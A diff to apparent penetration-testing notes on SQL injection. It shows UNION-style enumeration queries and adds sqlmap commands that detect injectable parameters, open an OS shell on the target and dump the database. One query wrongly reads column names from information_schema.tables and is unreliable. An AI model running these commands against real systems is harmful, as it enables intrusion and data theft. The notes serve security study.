@@ -9,6 +9,13 @@ Enumeration through query
 Note that the query will need to result in the same number of columns to avoid errors.
 
 `<query>` could be:
+
 - `select 1, table_name from information_schema.tables` (this is MariaDB specific)
 - `select 1, column_name from information_schema.tables where table_name='users'`
 - `select 1, username from users`
+
+SQLMAP
+
+- `sqlmap -u <URL>?<param>=X -p "<param>"` finds potential SQL injections, as well as dbms version
+- `sqlmap -u <URL>?<param>=X -p "<param>" --dbms=<DBMS> --os-shell` gives shell
+- `sqlmap -u <URL>?<param>=X -p "<param>" --dbms=<DBMS> --dump` dumps the db
